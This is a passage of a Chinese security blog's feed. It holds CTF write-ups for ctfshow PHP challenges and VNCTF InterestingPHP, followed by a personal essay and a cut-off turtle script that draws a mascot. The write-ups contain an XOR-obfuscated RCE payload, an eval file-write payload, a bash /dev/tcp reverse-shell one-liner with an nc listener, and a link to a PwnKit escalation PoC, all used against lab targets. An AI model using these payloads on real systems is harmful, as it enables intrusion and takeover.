class="line">    echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能题目本意不是这样但我直接无字母rce了</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%03%01%0b%01%06%0c%01%07%01%0f%08%0f&quot;^&quot;%60%60%7f%21%60%60%60%60%2f%7f%60%7f&quot;);</span><br></pre></td></tr></table></figure><h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><blockquote><p>你写的快还是我删的快？</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$files = scandir(&#x27;./&#x27;); </span><br><span class="line">foreach($files as $file) &#123;</span><br><span class="line">    if(is_file($file))&#123;</span><br><span class="line">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);</span><br><span class="line"></span><br><span class="line">$files = scandir(&#x27;./&#x27;); </span><br><span class="line">foreach($files as $file) &#123;</span><br><span class="line">    if(is_file($file))&#123;</span><br><span class="line">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个大问题，可以对index.php进行写的操作，直接将其用一句话木马覆盖掉</p><p>没什么好说的比较简单。</p><h2 id="web150-日志注入"><a href="#web150-日志注入" class="headerlink" title="web150(日志注入)"></a>web150(日志注入)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class CTFSHOW&#123;</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line">    private $vip;</span><br><span class="line">    private $secret;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;vip = 0;</span><br><span class="line">        $this-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isVIP()&#123;</span><br><span class="line">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __autoload($class)&#123;</span><br><span class="line">        if(isset($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#过滤字符</span><br><span class="line">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line">if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;</span><br><span class="line">    die(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class="line">extract($_GET);</span><br><span class="line">if(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    echo &quot;class is exists!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;</span><br><span class="line">    include($ctf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于ctf可以任意包含，可以使用日志注入，直接开搞。</p><p><img src="https://img-blog.csdnimg.cn/09c65a648bf24834acc42b5808d1506b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class CTFSHOW&#123;</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line">    private $vip;</span><br><span class="line">    private $secret;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;vip = 0;</span><br><span class="line">        $this-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isVIP()&#123;</span><br><span class="line">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __autoload($class)&#123;</span><br><span class="line">        if(isset($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#过滤字符</span><br><span class="line">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line">if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;</span><br><span class="line">    die(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class="line">extract($_GET);</span><br><span class="line">if(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    echo &quot;class is exists!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123;</span><br><span class="line">    include($ctf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这个题一点点小坑__autoload()函数不是类里面的</span><br><span class="line">__autoload — 尝试加载未定义的类</span><br><span class="line">最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦</span><br><span class="line">原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用</span><br><span class="line">__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo</span><br><span class="line">接下来就去getshell啦</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfshow-php的特性&quot;&gt;&lt;a href=&quot;#ctfshow-php的特性&quot; class=&quot;headerlink&quot; title=&quot;ctfshow php的特性&quot;&gt;&lt;/a&gt;ctfshow php的特性&lt;/h1&gt;&lt;h2 id=&quot;web89&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF InterestingPHP</title>
    <link href="http://websec.space/2022/02/14/[VNCTF%20InterestingPHP]/"/>
    <id>http://websec.space/2022/02/14/[VNCTF%20InterestingPHP]/</id>
    <published>2022-02-13T16:00:00.000Z</published>
    <updated>2022-02-13T16:08:21.092Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VNCTF-InterestingPHP"><a href="#VNCTF-InterestingPHP" class="headerlink" title="[VNCTF InterestingPHP]"></a>[VNCTF InterestingPHP]</h1><p>最近做PHP题目比较多，比赛当天这题思考比较多，但还是没出，今天看了官方wp记录一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); @eval($_GET[&#x27;exp&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>代码越简单，躲在暗处的禁用越多，果然system被ban了，phpinfo()都被ban了</p><p>先查看当前目录下的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(pos(localeconv())));</span><br><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; 1.php [3] =&gt; index.php [4] =&gt; secret.rdb )</span><br></pre></td></tr></table></figure><p>拿到后直接highlight_file又没有被ban</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&#x27;secret.rdb&#x27;);</span><br><span class="line">REDIS0008�    redis-ver4.0.9�</span><br><span class="line">redis-bits�@�ctime³��a�used-mem��aof-preamble���sercetye_w4nt_a_gir1fri3nd��nR�K��S</span><br></pre></td></tr></table></figure><p>开启了redis，估计是得用redis打。</p><p>但是还用var_dump(scandir(‘/‘))不给看，我又想能不能open_basedir，但用uaf打不通，直接返回500。</p><p>就这样浪费一点时间，走了一段弯路。</p><p>看redis打，就看内网开放了甚么端口。但system被ban，让我做题很被动。这也可能是最后没出的主要原因。。。</p><p>试了好多方法，也连上了蚁剑试了，刚才看官方的wp，发现ban了蚁剑的函数，果然。这里给出官方的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?exp=eval(file_put_contents(&quot;1.php&quot;,base64_decode($_POST[&#x27;a&#x27;])));</span><br><span class="line">POST:</span><br><span class="line">a=PD9waHAKaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pOwojIFBvcnQgc2Nhbgpmb3IoJGk9MDskaTw2NTUzNTskaS</span><br><span class="line">srKSB7CiAgJHQ9c3RyZWFtX3NvY2tldF9zZXJ2ZXIoInRjcDovLzAuMC4wLjA6Ii4kaSwkZWUsJGVlMik7CiAgaW</span><br><span class="line">YoJGVlMiA9PT0gIkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiKSB7CiAgICB2YXJfZHVtcCgkaSk7CiAgfQp9Cg</span><br></pre></td></tr></table></figure><blockquote><p>返回</p><p>int(80) int(8888)</p></blockquote><p>忽然看到群里有大佬发了自己的wp啊</p><p>我觉得很有意思就去尝试一下</p><blockquote><p>尝试 bypass 的 exp：<a href="https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php%EF%BC%8C%E5%85%B6%E4%B8%AD">https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php，其中</a> <code>fwrite</code> 被禁了，改成 <code>fputs</code></p></blockquote><p>我也尝试用这个exp打了一下</p><p>果然可以，如何尝试getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[c 端]</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1&quot;</span><br><span class="line">[s 端]</span><br><span class="line">nc -l 7777</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/28250c9bfcbc4016a93dd67b2b251de1.png" alt="img"></p><p>成功getshell泪目了，呜呜呜，就是没有访问的权限所以准备提权。</p><p><a href="https://github.com/arthepsy/CVE-2021-4034">arthepsy/CVE-2021-4034: PoC for PwnKit: Local Privilege Escalation Vulnerability in polkit’s pkexec (CVE-2021-4034) (github.com)</a></p><p><img src="https://img-blog.csdnimg.cn/04515c6fe5d3468d975f755bd171b2d3.png" alt="img"></p><p>顺着大佬的思路摸过来的，tql，开阔了玩web的思路。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VNCTF-InterestingPHP&quot;&gt;&lt;a href=&quot;#VNCTF-InterestingPHP&quot; class=&quot;headerlink&quot; title=&quot;[VNCTF InterestingPHP]&quot;&gt;&lt;/a&gt;[VNCTF InterestingPHP]&lt;/</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>咳，寒假</title>
    <link href="http://websec.space/2022/02/10/%E5%92%B3%EF%BC%8C%E5%AF%92%E5%81%87/"/>
    <id>http://websec.space/2022/02/10/%E5%92%B3%EF%BC%8C%E5%AF%92%E5%81%87/</id>
    <published>2022-02-09T16:00:00.000Z</published>
    <updated>2022-02-09T19:13:59.376Z</updated>
    
    <content type="html"><![CDATA[<h1 id="咳，寒假"><a href="#咳，寒假" class="headerlink" title="咳，寒假"></a>咳，寒假</h1><p>​        不知不觉，这个寒假又要过去了，大学的第二个寒假，半夜睡不着觉，索性爬起来，放一首轻音乐记录一下当下的感受。作作的文艺一把。这个寒假蛮忙碌的几乎没有休息一天，不敢停下，好吧我必须承认，我有点痴迷，甚至于魔怔。热爱安全的行业，喜欢各种奇奇怪怪小众的技巧，甚至于看一篇博客，甚至发现一些奇怪的漏洞，彻底的兴奋。</p><p>​        甚至于有些奇怪了，朋友发小约我出门的邀约大多数也都拒绝了，父母可能也不懂自己儿子，天天对着电脑上一串代码看的什么劲，每天早上一醒爬起来就看，但却也十分尊重我的爱好，尽可能的不影响，给我创造一个在这个环境的机会。可能也知道我从小到大，也没有对一个事物有如此的兴趣。想想高中的滑板还在宿舍躺着，小学的吉他早断了铉，少有的坚持。认识了一帮跟我一样真的喜欢安全的人，p神对于技术的态度，确实有点影响到我，甚至于觉得志同道合，（当然我是菜鸡，提起这些大佬多少有些崇拜），于是能够看到，哪怕大年三十，各种CTF还在出着红包题，成百人在参与着。可能大家已经把这些东西当成游戏了，（额，可能是我的感觉吧）。</p><p>​        但长期的学习，不知道从哪出来一股不服输的劲，甚至于慢慢的愈演愈烈（毕竟真正开始深入学习web安全的时间也就是半年过一点）。在有些比赛成绩不如别人时，我常常想为什么不如别人，这种情绪不知道什么时候慢慢开始积累的。甚至于今天晚上，我好像忘记了我开始去搞CTF，去搞安全开发，我的初心是什么，我对于技术的初心是什么。好像自己的努力都渐渐被量化成了flag，我拿到了就笑，拿不到就不高兴。这样的心情给自己产生了情绪，就是每天过的好累，好像忘掉了当时学到新东西时的兴奋，更甚至于想放弃了。想想也有一定道理，当我学习新知识，被今天刷了多少道题所深深禁锢时，我的目的变了，心情变了，情绪自然也变了。当初，我其实学这些的初衷，不是什么我要找工作，我要去大厂，我从大学第一天，因为高考糟糕透了的成绩，就下定决心要考研的。而是在之前的项目中所对于web的惊艳，至今我用grafana搭的第一个站，还在那挂着，依然对于在浏览器输入ip那一刻，显现在我眼前的画面所惊喜。当时我下定决心放弃学了一年的逆向，去学web。</p><p>​        其实有时候，我也想出去看一场电影，然后痛痛快快喝个大醉，回家沉沉睡上一觉。但现在不行，我有我的理想，我也还没有能力去挖到足够给力的漏洞，SkyMirror我不想是一个没进过线下的萌新队伍，我学校是什么所谓的弱校。我的目光又不得不看向两年以后的那场考研，很割裂，本夜网抑云的时候，总会想到这些事情，但好在人是积极向上的，明天醒来什么坏情绪都消失了。</p><blockquote><p>拿出半小时，写一个完全跟着情绪走，想到哪写到哪的文章，不知道一年后，两年后，甚至五年十年后，看看现在我所想的，所做的是什么样的感觉，这也是博客的便利，我能即刻的写下我当下的情绪，且能够长期保存。</p><p>写到这本来睡不着觉的我也困了，晚安好梦。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;咳，寒假&quot;&gt;&lt;a href=&quot;#咳，寒假&quot; class=&quot;headerlink&quot; title=&quot;咳，寒假&quot;&gt;&lt;/a&gt;咳，寒假&lt;/h1&gt;&lt;p&gt;​        不知不觉，这个寒假又要过去了，大学的第二个寒假，半夜睡不着觉，索性爬起来，放一首轻音乐记录一下当下的感受。</summary>
      
    
    
    
    <category term="闲聊" scheme="http://websec.space/categories/%E9%97%B2%E8%81%8A/"/>
    
    
    <category term="闲聊" scheme="http://websec.space/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>送你一个冰墩墩哦(turtle)~</title>
    <link href="http://websec.space/2022/02/10/%E9%80%81%E4%BD%A0%E4%B8%80%E4%B8%AA%E5%86%B0%E5%A2%A9%E5%A2%A9%E5%93%A6/"/>
    <id>http://websec.space/2022/02/10/%E9%80%81%E4%BD%A0%E4%B8%80%E4%B8%AA%E5%86%B0%E5%A2%A9%E5%A2%A9%E5%93%A6/</id>
    <published>2022-02-09T16:00:00.000Z</published>
    <updated>2022-02-10T06:12:42.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="送你一个冰墩墩哦-turtle"><a href="#送你一个冰墩墩哦-turtle" class="headerlink" title="送你一个冰墩墩哦(turtle)~"></a>送你一个冰墩墩哦(turtle)~</h1><p>今天在空间发了一个说说，是用python的turtle库画的一个冰墩墩。</p><p>好多人跑来问我要源码，我先说清楚来源，第一点说明这个冰墩墩的代码不是我写的，在群里一个群友说这个python代码跑不通，我复制了一下，我当时在聊天框看见，第一感觉以为是空格的问题，复制下来，一看就是个turtle，没有什么空格的问题，且一下就运行起来了，发现是画冰墩墩的很有意思。目前只知道是个开源，但不知道是哪位大佬写的代码，如果侵权留言我就把博客删掉了，（当然这个平时只有我自己看的博客）</p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br></pre></td><td class="code"><pre><span class="line">import turtle</span><br><span class="line"></span><br><span class="line">turtle.title(&#x27;冰墩墩&#x27;)</span><br><span class="line"></span><br><span class="line">turtle.speed(10)  # 速度</span><br><span class="line"></span><br><span class="line"># 左手</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(177, 112)</span><br><span class="line">turtle.pencolor(&quot;lightgray&quot;)</span><br><span class="line">turtle.pensize(3)</span><br><span class="line">turtle.fillcolor(&quot;white&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(80)</span><br><span class="line">turtle.circle(-45, 200)</span><br><span class="line">turtle.circle(-300, 23)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># 左手内</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(182, 95)</span><br><span class="line">turtle.pencolor(&quot;black&quot;)</span><br><span class="line">turtle.pensize(1)</span><br><span 